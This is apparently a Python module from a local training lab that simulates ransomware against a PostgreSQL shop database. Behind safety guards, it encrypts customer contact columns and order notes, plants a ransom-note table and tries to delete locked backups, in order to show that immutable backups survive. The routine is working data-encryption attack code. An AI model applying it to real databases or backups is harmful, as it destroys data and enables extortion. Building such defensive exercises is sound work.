"""SIMULATED ransomware for a local lab. Read lab/guard.py first.

It refuses to run unless ALL are true: LAB_MODE=true, DB host is localhost/127.0.0.1, DB name is
exactly ``shopdb``, and the user typed ATTACK (or passed --yes). It only modifies rows in that
one database. No persistence, no spreading, no file-system encryption, no network scanning, no
process injection. The only other thing it touches is the lab's own vault bucket, and only to
try (and fail) to delete backups.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from datetime import UTC, datetime
from typing import Any

from cryptography.fernet import Fernet

from lab import timeline
from lab.catalog import list_backups, locked_targets
from lab.config import LAB_DIR, Settings
from lab.guard import require_attack_allowed, require_connected_to_lab_db
from lab.health import RANSOM_TABLE

KEY_PATH = LAB_DIR / "attacker.key"
# Columns the attacker encrypts, for EVERY row. Constants only: never built from user input.
ENCRYPTED_COLUMNS: dict[str, tuple[str, ...]] = {
    "customers": ("email", "phone", "address"),
    "orders": ("notes",),
}
RANSOM_NOTE = (
    "YOUR DATA HAS BEEN ENCRYPTED. THIS IS A LAB SIMULATION: nobody is asking for money. "
    "The key is in .lab/attacker.key on the machine that ran `lab attack`."
)


class AttackError(RuntimeError):
    """The attack could not or should not proceed (not a safety-guard refusal)."""


@dataclass(frozen=True)
class DatabaseAttack:
    attack_start: datetime
    max_order_id: int | None
    encrypted_rows: dict[str, int]


def encrypt_values(fernet: Fernet, values: tuple[str | None, ...]) -> tuple[str | None, ...]:
    """Fernet-encrypt each value; NULL stays NULL. Tokens are base64 text with no '@'."""
    return tuple(None if v is None else fernet.encrypt(v.encode()).decode() for v in values)


def save_key(key: bytes) -> None:
    """Write the attacker's key (mode 0600) BEFORE touching any data."""
    KEY_PATH.parent.mkdir(parents=True, exist_ok=True)
    fd = os.open(KEY_PATH, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "wb") as handle:
        handle.write(key)


def _encrypt_table(cur: Any, fernet: Fernet, table: str, columns: tuple[str, ...]) -> int:
    names = ", ".join(columns)
    cur.execute(f"SELECT id, {names} FROM {table} ORDER BY id")
    encrypted = [(row[0], *encrypt_values(fernet, tuple(row[1:]))) for row in cur.fetchall()]
    definition = ", ".join(f"{c} text" for c in columns)
    cur.execute(f"CREATE TEMP TABLE enc_{table} (id bigint, {definition}) ON COMMIT DROP")
    with cur.copy(f"COPY enc_{table} (id, {names}) FROM STDIN") as copy:
        for row in encrypted:
            copy.write_row(row)
    assignments = ", ".join(f"{c} = e.{c}" for c in columns)
    cur.execute(f"UPDATE {table} t SET {assignments} FROM enc_{table} e WHERE t.id = e.id")
    return int(cur.rowcount)


def encrypt_database(conn: Any, fernet: Fernet) -> DatabaseAttack:
    """Encrypt the target columns of every row and drop the ransom note: ONE transaction.

    Writes to customers and orders are blocked while it runs (as a real attack would block the
    shop). Any failure rolls everything back.
    """
    try:
        with conn.cursor() as cur:
            cur.execute("SELECT current_database()")
            require_connected_to_lab_db(cur.fetchone()[0])
            cur.execute("SELECT to_regclass(%s)", (f"public.{RANSOM_TABLE}",))
            if cur.fetchone()[0] is not None:
                raise AttackError("already attacked (ransom note table exists): run `lab restore`")
            cur.execute("LOCK TABLE customers, orders IN SHARE ROW EXCLUSIVE MODE")
            started = datetime.now(UTC)
            cur.execute("SELECT max(id) FROM orders")
            newest = cur.fetchone()[0]
            rows = {
                table: _encrypt_table(cur, fernet, table, cols)
                for table, cols in ENCRYPTED_COLUMNS.items()
            }
            cur.execute(f"CREATE TABLE {RANSOM_TABLE} (id SERIAL PRIMARY KEY, note TEXT NOT NULL)")
            cur.execute(f"INSERT INTO {RANSOM_TABLE} (note) VALUES (%s)", (RANSOM_NOTE,))
        conn.commit()
    except BaseException:
        conn.rollback()
        raise
    return DatabaseAttack(started, newest, rows)


def _connect(settings: Settings) -> Any:
    from lab.db import connect

    return connect(settings)


def run_attack(
    settings: Settings, console: Any, *, confirmation: str | None = None, yes: bool = False
) -> None:
    """The whole simulated attack. The guard runs first, before anything else."""
    require_attack_allowed(settings, confirmation=confirmation, yes=yes)
    from lab.backup import print_result, run_backup_once
    from lab.storage import make_client
    from lab.vault_attack import count_survivors, print_attempts, run_attempts

    console.print("[bold red]ATTACK SIMULATION[/bold red] (local lab database only)")
    attacker = make_client(settings, "attacker")
    targets = locked_targets(list_backups(attacker, settings.s3_bucket), datetime.now(UTC))
    if not any(e.manifest and e.manifest["health"]["status"] == "clean" for e in targets):
        raise AttackError("no locked clean backup in the vault yet: run `lab backup` first")
    console.print(f"Attacker sees {len(targets)} locked backup(s) in the vault.")

    key = Fernet.generate_key()
    save_key(key)
    conn = _connect(settings)
    try:
        hit = encrypt_database(conn, Fernet(key))
    finally:
        conn.close()
    timeline.reset()
    timeline.record("attack_start", hit.attack_start)
    timeline.set_value("max_order_id_at_attack_start", hit.max_order_id)
    counts = ", ".join(f"{n:,} {t} rows" for t, n in hit.encrypted_rows.items())
    console.print(
        f"[red]Encrypted {counts}; left {RANSOM_TABLE.upper()}.[/red] Key: {KEY_PATH.name}"
    )

    attempts = run_attempts(attacker, settings.s3_bucket, targets)
    print_attempts(attempts, console)
    alive, total = count_survivors(attacker, settings.s3_bucket, targets)
    timeline.set_value("encrypted_rows", sum(hit.encrypted_rows.values()))
    timeline.set_value("vault_attempts", [vars(a) for a in attempts])
    timeline.set_value("locked_objects_targeted", total)
    timeline.set_value("locked_objects_surviving", alive)
    timeline.set_value("backup_interval_seconds", settings.backup_interval_seconds)
    timeline.set_value("retention_minutes", settings.retention_minutes)
    colour = "green" if alive == total else "bold red"
    console.print(
        f"[{colour}]{alive} of {total} locked backup objects still retrievable.[/{colour}]"
    )
    timeline.record("attack_end", datetime.now(UTC))

    console.print("The next scheduled backup runs after the attack and captures the damage:")
    print_result(run_backup_once(settings, console), console)
